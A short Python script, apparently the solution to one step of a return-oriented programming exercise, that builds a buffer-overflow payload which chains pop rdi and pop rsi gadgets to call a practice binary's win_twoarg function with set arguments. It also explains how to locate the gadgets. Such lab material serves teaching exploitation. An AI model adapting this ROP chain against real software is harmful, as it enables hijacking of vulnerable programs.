#!/usr/bin/env python3
# SPDX-License-Identifier: BSD-3-Clause
"""
Goal 3: redirect execution to win_twoarg(0xCAFE, 0xBABE).

Two arguments need to be loaded:
  RDI = 0xCAFE  (1st arg) via  pop rdi; ret
  RSI = 0xBABE  (2nd arg) via  pop rsi; ret

Note: GCC-generated binaries often have 'pop rsi; pop r15; ret' instead of
just 'pop rsi; ret'. In that case add an extra 8-byte dummy value after 0xBABE
to account for the r15 pop (see commented line below).

ROP chain after padding:
  pop_rdi_ret    <- load RDI
  0xCAFE
  pop_rsi_ret    <- load RSI (may include extra pop r15)
  0xBABE
  [0]            <- dummy for r15 if gadget is "pop rsi; pop r15; ret"
  win_twoarg     <- call with RDI=0xCAFE, RSI=0xBABE

Find addresses:
  nm rop_target | grep win_twoarg
  ROPgadget --binary rop_target | grep "pop rdi"
  ROPgadget --binary rop_target | grep "pop rsi"
"""

import os, struct

def p64(n): return struct.pack("<Q", n)

# ── set these after running the commands above ────────────────────────────────
pop_rdi_ret     = 0x0000000000401353   # PLACEHOLDER: pop rdi; ret
pop_rsi_ret     = 0x0000000000401351   # PLACEHOLDER: pop rsi; ret  (or pop rsi; pop r15; ret)
win_twoarg_addr = 0x0000000000401290   # PLACEHOLDER
arg_a = 0xCAFE
arg_b = 0xBABE
# ─────────────────────────────────────────────────────────────────────────────

offset = 72

payload  = offset * b"A"
payload += p64(pop_rdi_ret)      # pop rdi; ret -> RDI = arg_a
payload += p64(arg_a)
payload += p64(pop_rsi_ret)      # pop rsi; ret -> RSI = arg_b
payload += p64(arg_b)
# payload += p64(0)              # <- uncomment if gadget is "pop rsi; pop r15; ret"
payload += p64(win_twoarg_addr)  # call win_twoarg(RDI, RSI)

os.write(1, payload)
